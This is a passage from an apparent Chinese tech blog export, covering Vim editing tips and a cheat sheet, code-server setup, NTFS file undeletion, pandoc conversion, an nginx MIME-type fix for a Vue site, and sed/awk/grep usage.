进入V模式后，选择了需要编辑的内容之后，使用x可以剪切被框选的内容，y则可以复制区域内容，用p可以粘贴内容并覆盖所选区域；除此之外，用&quot;+y则可以复制内容到系统剪贴板，用&quot;+p可以从系统剪贴板粘贴。注意这快捷键前的双引号是必须的。 如果需要多次复制粘贴内容，需要在~/.vimrc添加如下配置来直接同步系统剪贴板和Vim剪贴板： 1&gt;set clipboard=unnamedplus 借助V模式，不用鼠标也能选取文字、复制粘贴。更详细的用法可以阅读Vim的help手册。 分屏与文件浏览使用vim时，用vim [filename]就可以打开/创建并编辑一个文件，不过filename也可以是目录名称，这样就会用vim内置的文件管理器打开目标目录。这个模式使用起来很简单，上下键移动光标，回车键确认。 分屏也是一个实用操作，不过学了tmux之后我就不怎么用vim的分屏操作了。 核心快捷键只有两组：Ctrl+w,h/v和Ctrl+w,h/j/k/l。第一组是分屏，h表示水平分屏，v表示垂直分屏。第二组快捷键表示在各个分屏中移动，h/j/k/l和vim默认模式的含义一样，表示向左/下/上/右移动。 另外，也可以通过:sp/vsp [filename]来水平/垂直分屏并打开名为filename的文件。 关闭分屏和关闭文件一样，选择当前分屏，用:q/wq(!)和ZZ都可以退出（并保存）当前文件。 命令模式在vim中也能直接和CLI交互，使用:![command]即可。其中，%表示当前文件的文件名。通过这个方法，我们可以快速调试单文件程序，例如： 12:w # 一定记得先保存当前文件再编译:!gcc % &amp;&amp; ./a.out 在命令模式输入上述代码，即可编译并运行当前文件。同时，命令模式也支持上下键回溯历史命令。 编写脚本时，借助它能够快速验证/执行脚本。 Ctrl+r这是一个常用的插入快捷键，用于在insert模式下插入各种内容。下面用&lt;C-r&gt;表示Ctrl+r。 插入寄存器中的内容在vim中，寄存器用于存储文本。您可以使用以下命令将寄存器中的内容插入到当前位置： 1&lt;C-r&gt;{register} 其中，{register}是要插入内容的寄存器名。例如，&lt;C-r&gt;0将插入0号寄存器中的内容。 插入表达式的结果您可以使用以下命令将表达式的结果插入到当前位置： 1&lt;C-r&gt;= {expression} &lt;CR&gt; 其中，{expression}是要求值的表达式。例如，&lt;C-r&gt;=2+2&lt;CR&gt;将在当前位置插入“4”，&lt;C-r&gt;=strftime('%c')&lt;CR&gt;可以插入当前日期。 插入文件名如果您希望将文件名插入到当前位置，可以使用以下命令： 1&lt;C-r&gt;% 这将在当前位置插入当前文件的名称。 插入上一次插入的文本如果您需要在插入模式下重新插入上一次插入的文本，可以使用以下命令： 1&lt;C-r&gt;&quot; 这将在当前位置插入最后一次插入的文本。 高效编辑这一部分比较杂，包含一些快捷操作。 插入删除 x 删除当前字符 i 在光标前插入 a 在光标后插入 o 在当前行后另起一行插入 O 在当前行前另起一行插入 另外，使用:g/pattern/d可以删除所有含有pattern的行。 快速跳转 :[line number] 快速跳转到目标行号 w 向后跳转一个单词 gg 跳转到全文开头，G 跳转到全文末 0 跳转到当前行初，$ 跳转到当前行末 /[keyword] 搜索并跳转到keyword处，n 继续向后搜索，N 向前搜索 n+h/j/k/l 向前/下/上/后跳转n单位 ctrl+i 跳转到上一个历史位置 ctrl+o 跳转到下一个历史位置 gi 跳转到上一次编辑的位置 [number]G 跳转到第number行，和:number效果一样 除了上面那些操作，Vim还提供了很多移动功能。比如浏览一些可以折叠的代码块时，可以用下面的命令展开和折叠： 1234zM &quot;折叠代码块zf[n]G &quot;折叠当前行到第n行zE &quot;删除所有的折叠标签（被折叠的区域会有大括号作为提示）zR &quot;展开代码块 这部分的内容，详细可以看Vim的帮助文档。输入:h Folding即可查看。 复制粘贴 dd 删除当前行，ndd 删除从当前行往后的n行，dn+h/l 删除光标前/后n个字符 yy 复制当前行，nyy 复制从当前行往后的n行，yn+h/l 复制光标前/后n个字符 p 粘贴复制的内容 重复操作（宏）这是Vim中最强大的功能之一。在处理较多数据的时候，真的能节省大量的时间。 q+[letter] 进入操作记录模式，随后除了 q的所有按键都会被记录 q 退出操作录制模式并保存之前的操作到letter @[letter] 重复录制的操作，n@[letter] 重复n次录制的操作 举个例子吧。比如我想删掉每行行末的两个字符，我就可以这么用： 1234Esc+gg &quot;跳转到开头qq &quot;开始录制宏到q中$,xx,j &quot;逗号表示隔开的操作。它表示先跳转到行末，然后删除两个字符，再跳到下一行q &quot;停止并保存宏到q 这样就完成录制了。随后移动光标到你编辑的起始位置，并输入n@q来批量操作，其中的n表示你需要重复操作的次数。 随后，欣赏魔法吧（雾 在录制宏的时候，尽量用相对定位，例如0和$（行首和行末），同时尽量先确认操作是能达到效果的，不然自动机乱飞就不好玩了（其实误操作也能用u救回来 借助其他程序处理BufferVim里边一个很好用的命令是:%![command]，它的作用是把Vim缓冲区作为command的标准输入，再把缓冲区替换为程序的标准输出。最近写go的时候这个就很方便了，需要格式化代码的时候:%!gofmt就好了。 Bin编辑用Esc+:进入命令模式后，输入%!xxd就可以用二进制模式查看文件。 要返回正常模式，只需要输入%!xxd -r即可返回。 jyy好强（ Vim+grep在Vim命令模式中可以这样使用grep： 12:%!grep execve # 提取出含有execve的行:%!grep -v ENOENT # 过滤掉含有ENOENT的行 这对buffer中的数据调用命令行进行处理，并替换（？）Vim Buffer中的内容。实质上和上面的Bin编辑类似（？）。 JSON内容格式化1:%!jq 使用jq对缓冲区中的内容进行格式化并替换缓冲区。 内容按照首字母排序众所周知bash里边可以在各种命令管道里边组合sort，其实Vim也可以： 1:%!sort 上面的命令使用sort命令对缓冲区中的行按照首字母进行排序。 范式.命令会重复上次修改，而查找命令（无论是/+n还是f+;）可以快速移动到下一个匹配位置。一个理想的Vim范式，就是使用一个命令修改，另一个命令移动&gt;. 上面的范式平时可以多用用。.不光可以重复操作，也可以重复键入上次编辑的内容，比如cw+输入+&lt;ESC&gt;这一段就可以用.来重复，然后用Vim的移动黑魔法带你去任何你想重复这个操作的地方，比如快速更改某个关键字但是又不能一股脑批量替换的情况。 MISC-其他技巧从磁盘重新加载文件比如，在日常编写一些文件的时候，可能会想顺手将一些内容直接输出（附加）到当前文件后，而不是输出后再想办法选择复制粘贴。但是如果你使用cat fname &gt;&gt; file_editing.md时，Vim的默认行为是不会自动从磁盘重新加载文件内容的。 这种时候就可以用:e!或者:edit!来强制清空当前未保存更改并从磁盘加载文件最新内容，覆盖当前缓冲区。因此有重要内容记得先yy复制一下以防丢失。 这种使用场景多见于写问题分析报告的时候，写着写着从终端输出一段日志到当前编写的报告里边来作为报告内容。当然，也可以是其他的内容，比如重要持续任务的数据流等，我会将文件作为输出并直接编辑输出内容。 另外也可以用:w start,end dest_file_name.md来将文件的一部分内容输出到另一个文件中。 输出重定向到Vim1strace -f gcc a.c |&amp; vim - 上面的管道符将strace的输出（stdin）重定向到了Vim中，便于我们查看和编辑。 另外，其实有不少UNIX程序都接受这个参数-，这个参数的约定一般指的是让程序使用标准输入和标准输出读取和写入内容。比如tar和dd两个命令都接受这个参数的约定语义。 0x03.配置文件一般指的是用户目录下的.vimrc文件。Vim启动时会自动读取并加载它。它的内容主要包含Vim设置项，自定义函数等。 下面是一份示例配置文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&quot;这是注释，以英文双引号开头syntax enablesyntax onset tabstop=4set shiftwidth=4set autoindentset smartindentset ignorecaseset cindentset shiftroundset encoding=utf-8set numberset rulerset hlsearchset laststatus=2&quot;set showmatch&quot;set cursorlinehighlight StatusLine guifg=SlateBlue guibg=Yellowlet g:netrw_winsize=30let g:netrw_liststyle=1let g:netrw_timefmt='%Y-%m-%d %H:%M:%S'filetype plugin onmap &lt;F5&gt; :call PRUN()&lt;CR&gt;nmap &lt;F6&gt; :Sexplore!&lt;CR&gt;inoremap &lt;TAB&gt; &lt;C-R&gt;=InsertTabWrapper()&lt;CR&gt;func! PRUN() exec &quot;w&quot; if &amp;filetype == 'python' exec &quot;!python %&quot; elseif &amp;filetype == 'c' exec &quot;!gcc % &amp;&amp; ./a.out &amp;&amp; rm ./a.out&quot; endifendfuncfunc! InsertTabWrapper() let col=col('.')-1 if !col || getline('.')[col-1] !~ '\\k' return &quot;\\&lt;TAB&gt;&quot; else return &quot;\\&lt;C-N&gt;&quot; endifendfunc Vim配置文件的路径在当前用户目录下，也就是/home/usrname/.vimrc，不同的用户都有各自的配置文件。 配置结构前两行是开启代码高亮和语法分析。第一大块主要是和缩进有关，前四行都是缩进设置，后几行分别是搜索时忽略大小写，启用C语言语法缩进，shiftround是啥来着忘了( 下一个小块（只有一行）是设置编码为utf-8。 下一个大块基本是界面显示相关设置。第一行是开启行号显示，第二行没啥用给注释掉了，第三行是显示当前光标在第几行第几列，第四行是高亮被搜索的关键字，下一行是在当前行显示下划线，用不上所以我注释掉了。下一行是显示编辑状态栏，再下一行是设置状态栏样式。 下一大块是设置自带的树状图文件浏览器的。 后面的一堆xxmap是配置按键事件/映射的。 后面那一堆func是各种函数，能够实现一些简单的功能，比如TAB补全，F5代码运行。 综上，可以看出，vim配置文件.vimrc的结构大致==可以分为5个部分==，分别是 编辑器一般设置。包括格式，高亮，vim外观等 常量设置。通过预设一些常量来更改vim行为 插件设置。 按键映射绑定。更改/添加按键功能 函数。给编辑器添加自定义的功能 通过更改配置文件，我们可以十分简便地更改vim的外观，操作，代码高亮和补全等。并且可以非常轻松地迁移配置——复制.vimrc到新的地方即可。唯一的缺点是，你通常不知道都有什么可以更改的设置。在这一点上，充分利用vim自带的帮助文档吧：输入:help并回车即可查看。 常用配置 set wrap/set nowrap 禁用换行 set number/set nonumber 启用/禁用行号 set ai/set noai 启用/禁用自动缩进，粘贴进代码自动缩进的话可以暂时关掉自动 0x04.常见问题 GVIM主界面乱码 修改C:\\Program Files (x86)\\Vim\\vim80\\menu.vim文件，增加 1set encoding=utf-8 改变字体大小 也是在上面的文件里，添加如下设置： 1set guifont=Lucida\\ Console:h14 如果没效果就把语句从文件末尾移到开头。 无法使用剪切板 最近用Vim的时候总是会跳出一个info：Authorization required, but no authorization protocol specified。最后在网上的vim-use邮件列表里边找到这个问题的答案了。原因是Vim和X-Server通信失败，导致出现了这个问题。为啥要访问X-Server呢？为了使用Vim的系统剪切板支持。所以解决方法可以是使用vim -X直接让Vim不和X-Server通信，100%有效。或者就是排查一下你的*nix发生了什么导致X-Server权限异常。 0x05.插件就我的观点来看，插件一般是没啥必要折腾的，当你Vim的各种特性熟悉之后，基本上大部分插件提供的功能你都能用原生Vim在可以接受的步骤里达到。 言归正传，现在的插件安装一般推荐使用Vim-plug，是个韩国人写的插件管理器，轻量好用，便于复刻。 0x06.写在最后编辑器之神的称号源于它编辑文本贼6，而不是能变身All in one IDE（虽然确实可以这么干），写大型项目还是建议直接一步到胃用VS/IDEA。Vim一般也就写写单文件程序/改改配置之类，以及适用于一切要求快速编辑的场合比如做笔记。 Vim可以给你黑魔法，让你用令人目瞪口呆的速度写下你所想的东西，或者是更改需要更改的东西。最大限度地消除了编辑器和你的思想间的带宽限制之后，所剩下唯一的桎梏，就是—— 你。 0x07.参考内容 VIM学习笔记 标记(Mark)","link":"/2021/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Vim%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"},{"title":"Vim备忘录","text":"How to Exit :q[uit] Quit Vim. This fails when changes have been made. :q[uit]! Quit without writing. :cq[uit] Quit always, without writing. :wq Write the current file and exit. :wq! Write the current file and exit always. :wq {file} Write to {file}. Exit if not editing the last :wq! {file} Write to {file} and exit always. :[range]wq[!] [file] Same as above, but only write the lines in [range]. ZZ Write current file, if modified, and exit. ZQ Quit current file and exit (same as “:q!”). Editing a File :e[dit] Edit the current file. This is useful to re-edit the current file, when it has been changed outside of Vim. :e[dit]! Edit the current file always. Discard any changes to the current buffer. This is useful if you want to start all over again. :e[dit] {file} Edit {file}. :e[dit]! {file} Edit {file} always. Discard any changes to the current buffer. gf Edit the file whose name is under or after the cursor. Mnemonic: “goto file”. Inserting Text a Append text after the cursor [count] times. A Append text at the end of the line [count] times. i Insert text before the cursor [count] times. I Insert text before the first non-blank in the line [count] times. gI Insert text in column 1 [count] times. o Begin a new line below the cursor and insert text, repeat [count] times. O Begin a new line above the cursor and insert text, repeat [count] times. Inserting a file :r[ead] [name] Insert the file [name] below the cursor. :r[ead] !{cmd} Execute {cmd} and insert its standard output below the cursor. Deleting Text &lt;Del&gt; or x Delete [count] characters under and after the cursor X Delete [count] characters before the cursor d{motion} Delete text that {motion} moves over dd Delete [count] lines D Delete the characters under the cursor until the end of the line {Visual}x or {Visual}d Delete the highlighted text (for {Visual} see Selecting Text). {Visual}CTRL-H or {Visual} When in Select mode: Delete the highlighted text {Visual}X or {Visual}D Delete the highlighted lines :[range]d[elete] Delete [range] lines (default: current line) :[range]d[elete] {count} Delete {count} lines, starting with [range] Changing (or Replacing) Text r{char} replace the character under the cursor with {char}. R Enter Insert mode, replacing characters rather than inserting ~ Switch case of the character under the cursor and move the cursor to the right. If a [count] is given, do that many characters. ~{motion} switch case of {motion} text. {Visual}~ Switch case of highlighted text Substituting :[range]s[ubstitute]/{pattern}/{string}/[c][e][g][p][r][i][I] [count] For each line in [range] replace a match of {pattern} with {string}. :[range]s[ubstitute] [c][e][g][r][i][I] [count] :[range]&amp;[c][e][g][r][i][I] [count] Repeat last :substitute with same search pattern and substitute string, but without the same flags. You may add extra flags The arguments that you can use for the substitute commands:[c] Confirm each substitution. Vim positions the cursor on the matching string. You can type: ‘y’ to substitute this match ‘n’ to skip this match to skip this match ‘a’ to substitute this and all remaining matches {not in Vi} ‘q’ to quit substituting {not in Vi} CTRL-E to scroll the screen up {not in Vi} CTRL-Y to scroll the screen down {not in Vi}.[e] When the search pattern fails, do not issue an error message and, in particular, continue in maps as if no error occurred.[g] Replace all occurrences in the line. Without this argument, replacement occurs only for the first occurrence in each line.[i] Ignore case for the pattern.[I] Don’t ignore case for the pattern.[p] Print the line containing the last substitute. Copying and Moving Text “{a-zA-Z0-9.%#:-“} Use register {a-zA-Z0-9.%#:-“} for next delete, yank or put (use uppercase character to append with delete and yank) ({.%#:} only work with put). :reg[isters] Display the contents of all numbered and named registers. :reg[isters] {arg} Display the contents of the numbered and named registers that are mentioned in {arg}. :di[splay] [arg] Same as :registers. [“x]y{motion} Yank {motion} text [into register x]. [“x]yy Yank [count] lines [into register x] [“x]Y yank [count] lines [into register x] (synonym for yy). {Visual}[“x]y Yank the highlighted text [into register x] (for {Visual} see Selecting Text). {Visual}[“x]Y Yank the highlighted lines [into register x] :[range]y[ank] [x] Yank [range] lines [into register x]. :[range]y[ank] [x] {count} Yank {count} lines, starting with last line number in [range] (default: current line), [into register x]. [“x]p Put the text [from register x] after the cursor [count] times. [“x]P Put the text [from register x] before the cursor [count] times. [“x]gp Just like “p”, but leave the cursor just after the new text. [“x]gP Just like “P”, but leave the cursor just after the new text. :[line]pu[t] [x] Put the text [from register x] after [line] (default current line). :[line]pu[t]! [x] Put the text [from register x] before [line] (default current line). Undo/Redo/Repeat u Undo [count] changes. :u[ndo] Undo one change. CTRL-R Redo [count] changes which were undone. :red[o] Redo one change which was undone. U Undo all latest changes on one line. {Vi: while not moved off of it} . Repeat last change, with count replaced with [count]. Moving AroundBasic motion commands: k h l j h or [count] characters to the left (exclusive). l or or [count] characters to the right (exclusive). k or or CTRL-P [count] lines upward j or or CTRL-J or or CTRL-N [count] lines downward (linewise). 0 To the first character of the line (exclusive). To the first character of the line (exclusive). ^ To the first non-blank character of the line $ or To the end of the line and [count - 1] lines downward g0 or g When lines wrap (‘wrap on): To the first character of the screen line (exclusive). Differs from “0” when a line is wider than the screen. When lines don’t wrap (‘wrap’ off): To the leftmost character of the current line that is on the screen. Differs from “0” when the first character of the line is not on the screen. g^ When lines wrap (‘wrap’ on): To the first non-blank character of the screen line (exclusive). Differs from “^” when a line is wider than the screen. When lines don’t wrap (‘wrap’ off): To the leftmost non-blank character of the current line that is on the screen. Differs from “^” when the first non-blank character of the line is not on the screen. g$ or g&lt;End&amp;gr; When lines wrap (‘wrap’ on): To the last character of the screen line and [count - 1] screen lines downward (inclusive). Differs from “$” when a line is wider than the screen. When lines don’t wrap (‘wrap’ off): To the rightmost character of the current line that is visible on the screen. Differs from “$” when the last character of the line is not on the screen or when a count is used. f{char} To [count]’th occurrence of {char} to the right. The cursor is placed on {char} (inclusive). F{char} To the [count]’th occurrence of {char} to the left. The cursor is placed on {char} (inclusive). t{char} Till before [count]’th occurrence of {char} to the right. The cursor is placed on the character left of {char} (inclusive). T{char} Till after [count]’th occurrence of {char} to the left. The cursor is placed on the character right of {char} (inclusive). ; Repeat latest f, t, F or T [count] times. , Repeat latest f, t, F or T in opposite direction [count] times. - [count] lines upward, on the first non-blank character (linewise). + or CTRL-M or [count] lines downward, on the first non-blank character (linewise). _ [count] - 1 lines downward, on the first non-blank character (linewise). or G Goto line [count], default last line, on the first non-blank character. or gg Goto line [count], default first line, on the first non-blank character. or w [count] words forward or W [count] WORDS forward e Forward to the end of word [count] E Forward to the end of WORD [count] or b [count] words backward or B [count] WORDS backward ge Backward to the end of word [count] gE Backward to the end of WORD [count] These commands move over words or WORDS. A word consists of a sequence of letters, digits and underscores, or a sequence of other non-blank characters, separated with white space (spaces, tabs, ). This can be changed with the ‘iskeyword’ option. A WORD consists of a sequence of non-blank characters, separated with white space. An empty line is also considered to be a word and a WORD. ( [count] sentences backward ) [count] sentences forward { [count] paragraphs backward } [count] paragraphs forward ]] [count] sections forward or to the next ‘{‘ in the first column. When used after an operator, then the ‘}’ in the first column. ][ [count] sections forward or to the next ‘}’ in the first column [[ [count] sections backward or to the previous ‘{‘ in the first column [] [count] sections backward or to the previous ‘}’ in the first column Screen movement commands z. Center the screen on the cursor zt Scroll the screen so the cursor is at the top zb Scroll the screen so the cursor is at the bottom Marks m{a-zA-Z} Set mark {a-zA-Z} at cursor position (does not move the cursor, this is not a motion command). m’ or m` Set the previous context mark. This can be jumped to with the “‘’” or “``” command (does not move the cursor, this is not a motion command). :[range]ma[rk] {a-zA-Z} Set mark {a-zA-Z} at last line number in [range], column 0. Default is cursor line. :[range]k{a-zA-Z} Same as :mark, but the space before the mark name can be omitted. ‘{a-z} To the first non-blank character on the line with mark {a-z} (linewise). ‘{A-Z0-9} To the first non-blank character on the line with mark {A-Z0-9} in the correct file `{a-z} To the mark {a-z} `{A-Z0-9} To the mark {A-Z0-9} in the correct file :marks List all the current marks (not a motion command). :marks {arg} List the marks that are mentioned in {arg} (not a motion command). For example: Searching /{pattern}[/] Search forward for the [count]’th occurrence of {pattern} /{pattern}/{offset} Search forward for the [count]’th occurrence of {pattern} and go {offset} lines up or down. / Search forward for the [count]’th latest used pattern //{offset} Search forward for the [count]’th latest used pattern with new. If {offset} is empty no offset is used. ?{pattern}[?] Search backward for the [count]’th previous occurrence of {pattern} ?{pattern}?{offset} Search backward for the [count]’th previous occurrence of {pattern} and go {offset} lines up or down ? Search backward for the [count]’th latest used pattern ??{offset} Search backward for the [count]’th latest used pattern with new {offset}. If {offset} is empty no offset is used. n Repeat the latest “/“ or “?” [count] times. N Repeat the latest “/“ or “?” [count] times in opposite direction. Selecting Text (Visual Mode)To select text, enter visual mode with one of the commands below, and use motion commands to highlight the text you are interested in. Then, use some command on the text. The operators that can be used are: ~ switch case d delete c change y yank shift right &lt; shift left ! filter through external command = filter through ‘equalprg’ option command gq format lines to ‘textwidth’ length v start Visual mode per character. V start Visual mode linewise. exit Visual mode without making any changes How to Suspend CTRL-Z Suspend Vim, like “:stop”. Works in Normal and in Visual mode. In Insert and Command-line mode, the CTRL-Z is inserted as a normal character. :sus[pend][!] or :st[op][!] Suspend Vim. If the ‘!’ is not given and ‘autowrite’ is set, every buffer with changes and a file name is written out. If the ‘!’ is given or ‘autowrite’ is not set, changed buffers are not written, don’t forget to bring Vim back to the foreground later! Daniel Gryniewicz / dang@fprintf.net","link":"/2023/09/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Vim%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"code-server：一个完美的WebIDE","text":"趁着放假想着配置个在线开发环境。于是顺手搜了下。好家伙还真有。 大概挑了下这个应该是最方便的了吧。 下载项目Github地址 这个是开源项目可以直接下最新Release或者自己clone后编译。 如果下载慢的话可以试试git加速下载。 配置我的系统是Ubuntu 20.04 LTS其他Linux应该一样。输入指令./code-server --help即可查看相关指令： 12345678910111213141516171819202122232425Usage: code-server [options]Run VS Code on a remote server.Options: -V, --version output the version number --cert &lt;value&gt; --cert-key &lt;value&gt; -e, --extensions-dir &lt;dir&gt; Override the main default path for user extensions. --extra-extensions-dir [dir] Path to an extra user extension directory (repeatable). (default: []) --extra-builtin-extensions-dir [dir] Path to an extra built-in extension directory (repeatable). (default: []) -d --user-data-dir &lt;dir&gt; Specifies the directory that user data is kept in, useful when running as root. --data-dir &lt;value&gt; DEPRECATED: Use '--user-data-dir' instead. Customize where user-data is stored. -h, --host &lt;value&gt; Customize the hostname. (default: &quot;0.0.0.0&quot;) -o, --open Open in the browser on startup. -p, --port &lt;number&gt; Port to bind on. (default: 8443) -N, --no-auth Start without requiring authentication. -H, --allow-http Allow http connections. -P, --password &lt;value&gt; DEPRECATED: Use the PASSWORD environment variable instead. Specify a password for authentication. --disable-telemetry Disables ALL telemetry. --socket &lt;value&gt; Listen on a UNIX socket. Host and port will be ignored when set. --install-extension &lt;value&gt; Install an extension by its ID. --bootstrap-fork &lt;name&gt; Used for development. Never set. --extra-args &lt;args&gt; Used for development. Never set. -h, --help output usage information 直接输入指令./code-server即可启动codeserver。打开浏览器输入http://localhost:8443即可进入。密码会在终端显示。输入后即可进入。 修改密码修改密码的指令是 1export PASSWORD=你的密码 然后再启动codeserver就可以使用自定义密码登录了。 后台运行如果没有安装screen程序就先安装一下： 1apt-get install screen -y 用cd切换到code-server然后输入以下指令： 1screen -dmS code-server ./code-server 这里的第一个code-server是screen的名称第二个就是code-server程序了。如果要关闭这个程序只需要进入这个screen再用Ctrl+C退出即可： 12screen -r code-server[Ctrl+C] 好了 这下就可以扔掉本地IDE了 到这里就可以愉快地在线coding了。不过注意所有文件都是储存在服务器上的哦。","link":"/2021/01/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/code-server%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%AE%8C%E7%BE%8E%E7%9A%84WebIDE/"},{"title":"Linux误删文件恢复","text":"删了私有云上几百个文件，不过好在最后发现只是删除了数据库里边的记录。万幸万幸。 注意，下面的操作只适用于删文件的进程已经挂了的情况，请根据自己情况选择合适的方法。 首先要做的赶紧杀掉所有进程，防止数据写入到磁盘覆盖inode，如果被覆盖基本就凉了。比如说，停止当前分区的服务，赶紧卸载当前分区设备，甚至直接断网都是有必要的。 123unmount /dev/sda1# 如果设备忙的话，用下面的命令强制卸载fuser -m -v -i -k /dir 然后用dd备份分区，防止恢复失败。比如可以用下面的指令： 1dd if=/dev/sda1 of=/tmp/sda1.img 工具准备根据分区类型使用extundelete或者ntfsundelete。后者直接安装ntfs-3g即可，前者使用apt安装extundelete。 恢复官方文档 如果是ntfs分区的话，用这个命令得到文件列表： 1234567891011121314151617181920# 这个-f是因为我懒得卸载卷了# 正常情况下还是先unmount了再操作，比较安全# 这样就不用加-f了sudo ntfsundelete -s /dev/sdc2 -f &gt; rec-list.txt# 或者还有下面这些指令# Look for deleted files on /dev/hda1.ntfsundelete /dev/hda1# Look for deleted documents on /dev/hda1.ntfsundelete /dev/hda1 -s -m '*.doc'# Look for deleted files between 5000 and 6000000 bytes, with at least 90% of the data# recoverable, on /dev/hda1.ntfsundelete /dev/hda1 -S 5k-6m -p 90# Look for deleted files altered in the last two daysntfsundelete /dev/hda1 -t 2d 然后可以按删除日期来筛查文件： 1cat rec-list.txt | grep 2023-08-30 &gt; res-filtered.txt 最后恢复文件： 123456789# Undelete inodes 2, 5 and 100 to 131 of device /dev/sda1ntfsundelete /dev/sda1 -u -i 2,5,100-131# Undelete inode number 3689, call the file 'work.doc', set it to recovered size and put it# in the user's home directory.ntfsundelete /dev/hda1 -u -T -i 3689 -o work.doc -d ~# Save MFT Records 3689 to 3690 to a file 'debug'ntfsundelete /dev/hda1 -c 3689-3690 -o debug","link":"/2023/08/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/linux-undelete/"},{"title":"pandoc初窥","text":"pandoc 是一个使用 Haskell 语言编写的一款跨平台、自由开源及命令行界面的标记语言转换工具，可实现不同标记语言间的格式转换，堪称该领域中的“瑞士军刀。pandoc 支持的输入和输出格式范围广泛，包括但不限于 Markdown、HTML、DOCX、PDF、LaTeX、EPUB 等。 pandoc 不是 python 的库，但是有一个 python 的封装，叫做 pypandoc，可以在 python 代码中调用 pandoc 的功能。pypandoc 可以使用 pip 命令安装，例如： 1pip install pypandoc pandoc 的日常用法主要是通过命令行来转换文档，例如： 1pandoc input.md -o output.html 这个命令就是将 input.md 这个 Markdown 文件转换为 output.html 这个 HTML 文件。pandoc 还有很多其他的选项和参数，可以参考 pandoc 的文档。 pandoc 也可以在 python 代码中使用 pypandoc 来转换文档，例如： 123import pypandocoutput = pypandoc.convert_file('input.md', 'html')print(output) 这段代码就是将 input.md 这个 Markdown 文件转换为 HTML 字符串，并打印出来。pypandoc 还有其他的方法和参数，可以参考 pypandoc 的文档。 pandoc 是一个非常强大和灵活的文档转换工具，可以帮助你在不同的文档格式之间进行转换，特别是对于 Markdown 这种简洁易用的标记语言，可以轻松地生成 PDF、电子书、幻灯片等多种形式的文档。 格式转换刚好今天得提交个Word报告，但是写东西我还是喜欢Vim，于是就打算写完转换成Word。正打算手动转换/网页在线转换的时候想起来了这个玩意—— 然后就一行秒了。 1pandoc -o $(OUTPUT) -f markdown -t docx $(MARKDOWN) 我直接从Makefile里摘出来的。用Makefile的话，写完敲个make就行。 最让我吃惊的是这玩意速度奇快,转换个快4000字的Markdown到Word，几乎跟我echo个字符串一样快，这还是我在7代intel移动端平台上测试的(?A?) Markdown转Tex，速度也很快1pandoc -w latex ./test.md -o test.tex","link":"/2023/12/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/pandoc_note/"},{"title":"nginx+vue项目部署后无法加载资源","text":"项目使用的nginx.conf如下： 1234567891011121314151617181920212223242526events { worker_connections 1024;}http { server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; try_files $uri $uri/ /index.html; } location /api/ { proxy_pass http://backend:8010/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_read_timeout 300s; } ... }} 前端在加载时会出现如下报错： 1Failed to load module script: Expected a JavaScript module script but the server responded with a MIME type of &quot;text/plain&quot;. Strict MIME type checking is enforced for module scripts per HTML spec. 解读下大概是服务端对于请求的资源的MIME类型返回错误，导致浏览器能接收到文件，但是因为MIME类型错误所以拒绝加载。 nginx对于任意请求的资源的响应类型都是text/plain，而前端要求MIME和文件后缀匹配，因此才会出现这个问题。 nginx安装后会有mime.types文件，其中存储了大部分常见的后缀-MIME类型对应关系。所以我们作如下修改： 123456789101112events { worker_connections 1024;}http {+ include mime.types;+ default_type application/octet-stream; server { ... }} 这样nginx就能返回正确的类型了。","link":"/2025/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/nginx+vue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%90%8E%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E8%B5%84%E6%BA%90/"},{"title":"sed，awk与grep","text":"前言 关于标题：实际上，sed，awk和grep有一个共同的爹叫ed。sed和awk的区别是控制指令不太一样，而grep是起源于ed的一个指令：g/re/p，即全局-正则表达式匹配-打印，相当于把这个ed指令提取出来专门用于编辑。 之前学了Vim，不过Vim不太容易和其他命令行工具结合实现一些自动化任务。随后我将目光投向了sed和awk，它们二者都满足这个条件：可以将一个源的数据经过一些预定义的变换，输出到另一个源中。这其中，我对sed相对更加熟悉一些，awk我感觉可能更复杂一些，而sed只需要正则表达式就行。比如我之前接触到的第一个sed表达式： 1sed -i 's@^\\(deb.*stable main\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/apt/termux-main stable main@' $PREFIX/etc/apt/sources.list 上面那段是termux清华源的换源指令。单就命令格式上来看，我觉得和Vim的%s替换表达式比较接近。 没接触之前，一直觉得这玩意很神奇；接触后更感觉这东西的设计太棒了，只需要指令，就能完成大段内容的编辑。 后来接触了正则和Vim之后觉得似曾相识，才发现sed的用法很像Vim的替换指令+正则。而且这一套下来，效率提升真不小。以前做一些爬虫都编辑麻烦，现在直接写个脚本就完事了。比如，我最近为了尝试这三个流编辑器，写了一个爬新闻的脚本： 123#!/bin/bashecho -e &quot;# IT news Today\\n\\n$(wget -qO- https://www.ithome.com/block/rank.html | grep -oP '&lt;li&gt;\\s*&lt;a\\K[^&gt;]+' | awk -F '&quot;' '{print &quot;[&quot;$2&quot;](&quot;$6&quot;)&quot;}' | sed 's/^/- /g')&quot; 这是一个简单的单行脚本：借助管道，将wget抓取到的网页直接交由grep，让它使用Perl正则表达式将新闻标题和链接匹配出来，再交由awk将具体的字段分离出来并按照markdown的标准进行加工，最后交由sed使用行编辑模式在每一行前面加上一个- 变换为markdown的列表。最后，将输出返回给echo 